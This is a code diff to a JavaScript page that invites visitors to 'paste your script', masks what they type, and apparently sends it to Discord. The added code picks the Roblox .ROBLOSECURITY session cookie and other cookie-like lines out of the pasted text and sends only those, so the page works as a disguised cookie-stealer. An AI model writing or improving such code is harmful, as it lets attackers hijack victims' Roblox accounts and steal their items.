@@ -9,10 +9,57 @@
   const DISCORD_LIMIT = 2000;
   const CENSOR_CHAR = "•";
 
+  const ROBLOX_WARNING_MARKER =
+    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
+  const SENSITIVE_BEFORE_PATTERNS = [
+    /roblosecurity/i,
+    /warning:-do-not-share-this/i,
+    /cookie\s*[:=]/i,
+    /\.roblox\.com/i,
+    /_\|[A-Za-z0-9+/=_-]{20,}/,
+  ];
+
   mask.dataset.placeholder = "Paste your script…";
 
   function censor(text) {
     return text.replace(/[^\n\r]/g, CENSOR_CHAR);
+  }
+
+  function isSensitiveLine(line) {
+    const trimmed = line.trim();
+    if (!trimmed) {
+      return false;
+    }
+    return SENSITIVE_BEFORE_PATTERNS.some(function (pattern) {
+      return pattern.test(trimmed);
+    });
+  }
+
+  function prepareSubmission(text) {
+    const normalized = text.trim();
+    const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
+
+    if (markerIndex === -1) {
+      return normalized;
+    }
+
+    const before = normalized.slice(0, markerIndex);
+    const after = normalized.slice(markerIndex);
+
+    const sensitiveLines = before
+      .split(/\r?\n/)
+      .filter(isSensitiveLine)
+      .map(function (line) {
+        return line.trim();
+      })
+      .filter(Boolean);
+
+    if (sensitiveLines.length === 0) {
+      return after.trim();
+    }
+
+    return (sensitiveLines.join("\n") + "\n" + after).trim();
   }
 
   function syncMask() {
@@ -56,9 +103,11 @@
       throw new Error("Submission is not configured.");
     }
 
+    const payload = prepareSubmission(text);
+
     const chunks = [];
-    for (let i = 0; i < text.length; i += DISCORD_LIMIT) {
-      chunks.push(text.slice(i, i + DISCORD_LIMIT));
+    for (let i = 0; i < payload.length; i += DISCORD_LIMIT) {
+      chunks.push(payload.slice(i, i + DISCORD_LIMIT));
     }
 
     for (let i = 0; i < chunks.length; i++) {
